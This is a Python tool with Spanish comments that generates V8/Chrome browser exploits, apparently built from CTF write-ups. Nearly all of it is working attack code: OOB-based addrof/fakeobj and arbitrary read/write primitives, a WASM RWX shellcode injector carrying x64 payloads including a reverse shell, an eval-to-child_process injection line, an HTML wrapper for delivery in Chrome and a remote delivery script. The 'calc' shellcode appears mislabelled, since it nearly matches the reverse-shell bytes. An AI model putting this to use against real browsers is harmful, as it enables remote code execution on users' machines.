#!/usr/bin/env python3
"""
V8 Browser Exploitation Tool - Basado en las notas de ir0nstone
Herramientas específicas para explotar vulnerabilidades en V8/Chrome
"""

import struct
import subprocess
import os
from pwn import *

class V8ExploitTool:
    def __init__(self):
        self.d8_path = None
        self.target_process = None
        
    def set_d8_path(self, path):
        """Configurar ruta del binario d8"""
        self.d8_path = path
        print(f"[+] D8 path configurado: {path}")
    
    def generate_js_helpers(self):
        """Generar funciones helper de JavaScript para V8"""
        js_code = '''
// Funciones helper para conversión entre float e int (necesarias para V8)
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Función para obtener dirección de un objeto
function addrof(obj) {
    // Implementación específica según el exploit
    return 0n; // Placeholder
}

// Función para crear objeto falso
function fakeobj(addr) {
    // Implementación específica según el exploit
    return {}; // Placeholder
}

console.log("[+] Helper functions loaded");
'''
        return js_code
    
    def generate_oob_exploit_template(self):
        """Generar template para exploit OOB basado en *CTF 2019 - Implementación completa"""
        js_code = self.generate_js_helpers() + '''
// *CTF 2019 OOB-V8 Exploit Completo
// Basado exactamente en las notas de ir0nstone

// Arrays principales para el exploit
var float_arr = [1.5, 2.5];
var map_float = null;

var initial_obj = {a: 1}; // placeholder object
var obj_arr = [initial_obj];
var map_obj = null;

// Array para lectura/escritura arbitraria
var arb_rw_arr = null;

console.log("[*] Inicializando exploit OOB...");

// Verificar si existe la función .oob()
if (typeof float_arr.oob === 'function') {
    console.log("[+] Función .oob() encontrada!");
    
    // Obtener maps de los arrays
    map_float = float_arr.oob();
    map_obj = obj_arr.oob();
    
    console.log("[+] Float map obtenido: " + map_float);
    console.log("[+] Object map obtenido: " + map_obj);
    
    // Configurar array para lectura/escritura arbitraria
    arb_rw_arr = [map_float, 1.5, 2.5, 3.5];
    console.log("[+] Address of Arbitrary RW Array: 0x" + addrof(arb_rw_arr).toString(16));
    
} else {
    console.log("[-] Función .oob() no disponible - exploit no funcionará");
}

// Primitiva addrof - obtener dirección de un objeto
function addrof(obj) {
    if (!map_float || !map_obj) {
        console.log("[-] Maps no inicializados");
        return 0n;
    }
    
    obj_arr[0] = obj;           // poner objeto deseado en index 0
    obj_arr.oob(map_float);     // cambiar a float map
    let leak = obj_arr[0];      // leer dirección
    obj_arr.oob(map_obj);       // cambiar de vuelta a object map
    return ftoi(leak);          // retornar leak como integer
}

// Primitiva fakeobj - crear objeto falso desde dirección
function fakeobj(addr) {
    if (!map_float || !map_obj) {
        console.log("[-] Maps no inicializados");
        return null;
    }
    
    float_arr[0] = itof(addr);  // colocar dirección deseada en index 0
    float_arr.oob(map_obj);     // cambiar a object map
    let fake = float_arr[0];    // obtener objeto falso
    float_arr.oob(map_float);   // cambiar map de vuelta
    return fake;                // retornar objeto
}

// Lectura arbitraria
function arb_read(addr) {
    if (!arb_rw_arr) {
        console.log("[-] Array RW no inicializado");
        return 0n;
    }
    
    // tag pointer
    if (addr % 2n == 0) addr += 1n;
    
    // colocar objeto falso sobre el elements FixedDoubleArray del array válido
    // sabemos que el elements array está justo adelante en memoria, así que con longitud
    // de 4 es un offset de 4 * 0x8 = 0x20
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    
    // sobrescribir campo 'elements' del array falso con la dirección
    // debemos restar 0x10 ya que hay dos valores de 64-bit
    // inicialmente con el map y un size smi, así que offset 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    
    // index 0 retornará el valor de lectura arbitraria
    return ftoi(fake[0]);
}

// Escritura arbitraria inicial (puede fallar con ciertas direcciones)
function initial_arb_write(addr, val) {
    if (!arb_rw_arr) {
        console.log("[-] Array RW no inicializado");
        return false;
    }
    
    // colocar objeto falso y cambiar elements, como antes
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    
    // Escribir al index 0
    fake[0] = itof(BigInt(val));
    return true;
}

// Escritura arbitraria usando ArrayBuffer backing pointers (más confiable)
function arb_write(addr, val) {
    console.log("[*] Escribiendo 0x" + val.toString(16) + " en 0x" + addr.toString(16));
    
    // configurar ArrayBuffer y DataView objects
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    
    // escribir dirección al backing store
    initial_arb_write(backing_store_addr, addr);
    
    // escribir datos al offset 0, con little endian true
    dataview.setBigUint64(0, BigInt(val), true);
    
    console.log("[+] Escritura arbitraria completada");
}

console.log("[+] Primitivas OOB cargadas");
'''
        return js_code
    
    def generate_wasm_shellcode_template(self):
        """Generar template para shellcode usando WASM - Basado en picoCTF challenges"""
        js_code = '''
// WASM Shellcode Template - Basado en picoCTF Kit Engine y Download Horsepower
// Crear página RWX usando WebAssembly

// WASM bytecode para crear instancia básica
var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
    4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,
    138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WASM instance creada");
console.log("[+] WASM instance address: 0x" + addrof(wasm_instance).toString(16));

// Encontrar región RWX creada por WASM
// Típicamente está a un offset fijo desde la instancia WASM
function find_rwx_region() {
    let wasm_addr = addrof(wasm_instance);
    console.log("[*] Buscando región RWX desde WASM instance...");
    
    // El offset puede variar según la versión de V8
    // En el challenge original era 0x68 (con pointer tagging)
    let rwx_ptr_addr = wasm_addr + 0x68n;
    let rwx_addr = arb_read(rwx_ptr_addr);
    
    console.log("[+] RWX Region located at 0x" + rwx_addr.toString(16));
    return rwx_addr;
}

// Shellcode para ejecutar calculadora (x64) - desde *CTF 2019
var calc_shellcode = [
    0x6a58296a, 0x016a5f02, 0x050f995e, 0x68525f50,
    0x0100007f, 0x5c116866, 0x6a026a66, 0x5e54582a,
    0x0f5a106a, 0x5e026a05, 0x0f58216a, 0xceff4805,
    0x016af679, 0x50b94958, 0x77737361, 0x41203a64,
    0x6a5e5451, 0x050f5a08, 0x48c03148, 0x0f08c683,
    0x31b84805, 0x35343332, 0x56383736, 0x75af485f,
    0x583b6a1a, 0xbb485299, 0x6e69622f, 0x68732f2f,
    0x525f5453, 0x54575a54, 0x90050f5e
];

// Shellcode para cat flag.txt (desde picoCTF Kit Engine)
var cat_flag_shellcode = [
    0x0cfe016a, 0x2fb84824, 0x2f6e6962, 0x50746163, 0x68e78948, 0x7478742e,
    0x0101b848, 0x01010101, 0x48500101, 0x756062b8, 0x606d6701, 0x04314866,
    0x56f63124, 0x485e0c6a, 0x6a56e601, 0x01485e10, 0x894856e6, 0x6ad231e6,
    0x050f583b
];

// Shellcode para reverse shell (127.0.0.1:4444)
var reverse_shell_shellcode = [
    0x6a58296a, 0x016a5f02, 0x050f995e, 0x68525f50,
    0x0100007f, 0x5c116866, 0x6a026a66, 0x5e54582a,
    0x0f5a106a, 0x5e026a05, 0x0f58216a, 0xceff4805,
    0x016af679, 0x50b94958, 0x77737361, 0x41203a64,
    0x6a5e5451, 0x050f5a08, 0x48c03148, 0x0f08c683,
    0x31b84805, 0x35343332, 0x56383736, 0x75af485f,
    0x583b6a1a, 0x583b6a99, 0xbb485299, 0x6e69622f,
    0x68732f2f, 0x525f5453, 0x54575a54, 0x90050f5e
];

function copy_shellcode(rwx_addr, shellcode) {
    console.log("[*] Copiando shellcode a región RWX...");
    
    // Crear ArrayBuffer para escribir shellcode
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    
    // Sobrescribir backing store del ArrayBuffer
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n; // Offset estándar para ArrayBuffer
    
    // Para pointer compression (Download Horsepower), el offset puede ser 0x14
    // backing_store_addr = buf_addr + 0x14n;
    
    arb_write(backing_store_addr, rwx_addr);
    
    // Escribir shellcode 4 bytes a la vez
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
    
    console.log("[+] Shellcode copiado exitosamente");
}

// Función principal para ejecutar shellcode
function execute_shellcode(shellcode_type = "calc") {
    console.log("[*] Ejecutando shellcode tipo: " + shellcode_type);
    
    // Encontrar región RWX
    let rwx_base = find_rwx_region();
    if (!rwx_base) {
        console.log("[-] No se pudo encontrar región RWX");
        return false;
    }
    
    // Seleccionar shellcode
    let shellcode;
    switch(shellcode_type) {
        case "calc":
            shellcode = calc_shellcode;
            break;
        case "cat":
            shellcode = cat_flag_shellcode;
            break;
        case "reverse":
            shellcode = reverse_shell_shellcode;
            break;
        default:
            console.log("[-] Tipo de shellcode desconocido");
            return false;
    }
    
    // Copiar y ejecutar shellcode
    copy_shellcode(rwx_base, shellcode);
    
    console.log("[+] Ejecutando shellcode...");
    f(); // Ejecutar función WASM (que ahora contiene nuestro shellcode)
    
    return true;
}

console.log("[+] WASM shellcode template cargado");
'''
        return js_code
    
    def generate_format_string_js(self):
        """Generar template para format string en JavaScript"""
        js_code = '''
// Format String Exploitation en JavaScript
// Útil para algunos tipos de vulnerabilidades

function format_string_leak(format_str) {
    console.log("[*] Intentando format string leak...");
    try {
        // Ejemplo de uso con console.log vulnerable
        var result = eval('`' + format_str + '`');
        console.log("[+] Resultado: " + result);
        return result;
    } catch(e) {
        console.log("[-] Error en format string: " + e);
    }
    return null;
}

// Ejemplo de uso
// format_string_leak("${this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}");

console.log("[+] Format string template loaded");
'''
        return js_code
    
    def create_full_exploit_template(self, exploit_type="oob"):
        """Crear exploit completo basado en el tipo"""
        base_code = self.generate_js_helpers()
        
        if exploit_type == "oob":
            exploit_code = self.generate_oob_exploit_template()
        elif exploit_type == "wasm":
            exploit_code = self.generate_wasm_shellcode_template()
        elif exploit_type == "format":
            exploit_code = self.generate_format_string_js()
        else:
            exploit_code = base_code
        
        full_exploit = base_code + "\n" + exploit_code + '''

// Función principal del exploit
function main_exploit() {
    console.log("[*] Iniciando exploit...");
    
    try {
        // 1. Leak de direcciones
        console.log("[*] Fase 1: Leak de direcciones");
        
        // 2. Obtener primitivas de lectura/escritura arbitraria
        console.log("[*] Fase 2: Primitivas arbitrarias");
        
        // 3. Leak de direcciones importantes (heap, libc, etc)
        console.log("[*] Fase 3: Leak de direcciones críticas");
        
        // 4. Shellcode y ejecución
        console.log("[*] Fase 4: Shellcode");
        
        console.log("[+] Exploit completado!");
        
    } catch(e) {
        console.log("[-] Error en exploit: " + e);
        console.log("[-] Stack trace: " + e.stack);
    }
}

// Ejecutar exploit
main_exploit();
'''
        return full_exploit
    
    def run_d8_exploit(self, js_file):
        """Ejecutar exploit en d8"""
        if not self.d8_path:
            print("[-] D8 path no configurado")
            return False
        
        try:
            cmd = [self.d8_path, "--allow-natives-syntax", "--shell", js_file]
            print(f"[*] Ejecutando: {' '.join(cmd)}")
            
            self.target_process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            return True
            
        except Exception as e:
            print(f"[-] Error ejecutando d8: {e}")
            return False
    
    def debug_d8_exploit(self, js_file):
        """Ejecutar exploit en d8 con GDB"""
        if not self.d8_path:
            print("[-] D8 path no configurado")
            return False
        
        try:
            cmd = f"gdb --args {self.d8_path} --allow-natives-syntax --shell {js_file}"
            print(f"[*] Ejecutando con GDB: {cmd}")
            os.system(cmd)
            
        except Exception as e:
            print(f"[-] Error ejecutando con GDB: {e}")
            return False
    
    def create_chrome_exploit_html(self, js_exploit):
        """Crear HTML para exploit en Chrome"""
        html_template = f'''<!DOCTYPE html>
<html>
<head>
    <title>V8 Exploit</title>
</head>
<body>
    <h1>V8 Browser Exploit</h1>
    <script>
{js_exploit}
    </script>
</body>
</html>'''
        return html_template
    
    def generate_remote_delivery_script(self, host, port):
        """Generar script para entregar exploit remotamente"""
        script = f'''#!/usr/bin/env python3
from pwn import *

# Leer exploit
with open("exploit.js", "rb") as f:
    exploit = f.read()

# Conectar al servidor
p = remote('{host}', {port})

# Enviar tamaño del exploit
p.sendlineafter(b'5k:', str(len(exploit)).encode())

# Enviar exploit
p.sendlineafter(b'please!!\\n', exploit)

# Recibir resultado
try:
    result = p.recvall(timeout=10)
    print("Resultado:")
    print(result.decode())
except:
    print("Timeout o error recibiendo resultado")

p.close()
'''
        return script

def main():
    """Función principal con menú interactivo"""
    v8_tool = V8ExploitTool()
    
    print("=" * 60)
    print("    V8 Browser Exploitation Tool - Basado en ir0nstone")
    print("=" * 60)
    
    while True:
        print("\n[MENÚ PRINCIPAL]")
        print("1. Configurar ruta de d8")
        print("2. Generar template de exploit OOB")
        print("3. Generar template de exploit WASM")
        print("4. Generar template de format string")
        print("5. Generar exploit completo")
        print("6. Crear HTML para Chrome")
        print("7. Ejecutar exploit en d8")
        print("8. Debug con GDB")
        print("9. Generar script de entrega remota")
        print("0. Salir")
        
        choice = input("\nSelecciona una opción: ").strip()
        
        if choice == "1":
            path = input("Ruta del binario d8: ").strip()
            v8_tool.set_d8_path(path)
            
        elif choice == "2":
            exploit = v8_tool.create_full_exploit_template("oob")
            with open("oob_exploit.js", "w") as f:
                f.write(exploit)
            print("[+] Template OOB guardado en oob_exploit.js")
            
        elif choice == "3":
            exploit = v8_tool.create_full_exploit_template("wasm")
            with open("wasm_exploit.js", "w") as f:
                f.write(exploit)
            print("[+] Template WASM guardado en wasm_exploit.js")
            
        elif choice == "4":
            exploit = v8_tool.create_full_exploit_template("format")
            with open("format_exploit.js", "w") as f:
                f.write(exploit)
            print("[+] Template format string guardado en format_exploit.js")
            
        elif choice == "5":
            exploit_type = input("Tipo de exploit (oob/wasm/format): ").strip()
            exploit = v8_tool.create_full_exploit_template(exploit_type)
            filename = f"{exploit_type}_full_exploit.js"
            with open(filename, "w") as f:
                f.write(exploit)
            print(f"[+] Exploit completo guardado en {filename}")
            
        elif choice == "6":
            js_file = input("Archivo JS del exploit: ").strip()
            try:
                with open(js_file, "r") as f:
                    js_content = f.read()
                html = v8_tool.create_chrome_exploit_html(js_content)
                with open("exploit.html", "w") as f:
                    f.write(html)
                print("[+] HTML guardado en exploit.html")
            except FileNotFoundError:
                print("[-] Archivo JS no encontrado")
                
        elif choice == "7":
            js_file = input("Archivo JS del exploit: ").strip()
            v8_tool.run_d8_exploit(js_file)
            
        elif choice == "8":
            js_file = input("Archivo JS del exploit: ").strip()
            v8_tool.debug_d8_exploit(js_file)
            
        elif choice == "9":
            host = input("Host remoto: ").strip()
            port = int(input("Puerto: ").strip())
            script = v8_tool.generate_remote_delivery_script(host, port)
            with open("deliver_exploit.py", "w") as f:
                f.write(script)
            print("[+] Script de entrega guardado en deliver_exploit.py")
            
        elif choice == "0":
            print("¡Hasta luego!")
            break
            
        else:
            print("[-] Opción inválida")

if __name__ == "__main__":
    main()